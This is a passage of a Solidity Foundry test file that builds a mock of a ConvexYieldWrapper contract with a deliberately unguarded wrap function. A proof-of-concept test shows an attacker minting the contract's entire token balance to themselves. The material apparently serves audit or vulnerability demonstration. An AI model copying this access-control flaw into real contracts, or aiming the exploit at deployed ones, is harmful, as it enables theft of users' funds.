    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
}

interface IRewardStaking { function stake(uint256 amount) external; }

// Minimal pool mock to accept stake calls
contract MockPool is IRewardStaking {
    mapping(address => uint256) public staked;
    function stake(uint256 amount) external override { staked[msg.sender] += amount; }
}

// Minimal vulnerable replica of ConvexYieldWrapper focusing on `wrap`
contract ConvexYieldWrapper {
    address public convexToken;
    address public convexPool;
    mapping(address => uint256) public _balanceOf;
    bool public isShutdown;
    event Deposited(address indexed from, address indexed to, uint256 amount, bool something);

    constructor(address _convexToken, address _convexPool) {
        convexToken = _convexToken;
        convexPool = _convexPool;
    }

    // no-op checkpoint to keep minimal behavior
    function _checkpoint(address[2] memory) internal {}
    function _mint(address to, uint256 amount) internal { _balanceOf[to] += amount; }

    // Vulnerable: external, no access control, mints based on contract's convex token balance
    function wrap(address to_, address from_) external {
        require(!isShutdown, "shutdown");
        uint256 amount_ = MockERC20(convexToken).balanceOf(address(this));
        require(amount_ > 0, "No convex token to wrap");

        _checkpoint([address(0), from_]);
        _mint(to_, amount_);
        IRewardStaking(convexPool).stake(amount_);

        emit Deposited(msg.sender, to_, amount_, false);
    }
}

contract ConvexYieldWrapperTest is Test {
    ConvexYieldWrapper target;
    MockERC20 convex;
    MockPool pool;
    address attacker;

    function setUp() public {
        convex = new MockERC20();
        pool = new MockPool();
        target = new ConvexYieldWrapper(address(convex), address(pool));
        attacker = makeAddr("attacker");

        // Seed the wrapper contract with convex tokens so wrap can succeed
        convex.mint(address(target), 100 ether);
    }

    function test_attacker_exploits_wrap() public {
        vm.prank(attacker);
        target.wrap(attacker, attacker);

        // Attacker received minted wrapper tokens equal to the contract's convex balance
        assertEq(target._balanceOf(attacker), 100 ether);
        // The wrapper also called stake on the pool with the amount
        assertEq(pool.staked(address(target)), 100 ether);
    }
}

